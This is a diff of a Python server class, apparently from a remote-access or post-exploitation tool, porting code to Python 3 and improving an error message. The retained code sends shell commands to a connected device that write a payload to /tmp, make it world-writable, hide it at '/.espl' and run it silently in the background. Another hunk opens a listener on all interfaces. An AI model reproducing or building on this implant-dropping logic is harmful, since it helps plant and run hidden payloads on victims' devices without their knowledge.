@@ -121,11 +121,8 @@ class Server:
             f = open("resources/esplios", "rb")
             payload = f.read()
             f.close()
-            instructions = \
-                "cat >/tmp/tmpespl;" +\
-                "chmod 777 /tmp/tmpespl;" +\
-                "mv /tmp/tmpespl /.espl;" +\
-                "/.espl "+payload_parameter+" 2>/dev/null &\n"
+            instructions = ("cat >/tmp/tmpespl;" + "chmod 777 /tmp/tmpespl;" +
+                            "mv /tmp/tmpespl /.espl;" + "/.espl " + payload_parameter.decode() + " 2>/dev/null &\n")
             return (instructions, payload)
         else:
             if device_arch == "Linux":
@@ -153,8 +150,8 @@ class Server:
         s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         try:
           s.bind(('0.0.0.0', self.port))
-        except Exception:
-          h.info_error("Port/Address already in use!")
+        except Exception as err:
+          h.info_error("Port/Address already in use! (" + str(err) + ")")
         s.listen(1)
         self.verbose_print("Listening on port "+str(self.port)+"...")
         try:
